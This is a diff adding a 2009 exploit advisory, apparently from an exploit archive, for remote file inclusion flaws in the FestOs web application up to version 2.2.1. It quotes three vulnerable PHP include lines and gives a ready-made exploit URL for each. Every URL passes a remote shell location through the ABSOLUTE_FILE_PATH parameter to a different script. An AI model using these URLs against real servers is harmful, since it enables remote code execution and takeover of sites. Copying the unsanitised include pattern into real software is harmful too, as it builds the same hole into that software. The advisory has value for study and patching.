@@ -1,0 +1,51 @@
+##################################################################
+## Exploit Title: FestOs <= 2.2.1 Multiple RFI Exploit          ##
+## Date: 19-12-2009                                             ##
+## Author: cr4wl3r                                              ##
+## Software Link: http://code.google.com/p/festos/downloads/list##
+## Version: N/A                                                 ##
+## Tested on: GNU/LINUX                                         ##
+##################################################################
+
+~ Code : [reports_placement.php]
+
+<?php 
+$title = "Jury Sheet Report";
+
+require_once($config['ABSOLUTE_FILE_PATH'].'core/core.php');
+if($_SESSION["roleID"] > $reports) {
+   header("Location:index.php");
+}
+include "includes/reportheader.php";
+?>
+
+
+~ 3xplo!t :
+
+[festos_path]/admin/reports_placement.php?ABSOLUTE_FILE_PATH=[Shell]
+
+
+~ Code : [FestOS.php]
+
+require_once($config['ABSOLUTE_FILE_PATH']."core/sessions.php");
+
+
+~ 3xplo!t :
+
+[festos_path]/core/FestOS.php?ABSOLUTE_FILE_PATH=[Shell]
+
+
+
+~ Code : [reportheader.php]
+
+require_once($config['ABSOLUTE_FILE_PATH'].'core/core.php');
+
+
+~ 3xplo!t :
+
+[festos_path]/admin/includes/reportheader.php?ABSOLUTE_FILE_PATH=[Shell]
+
+
+and more...
+
+
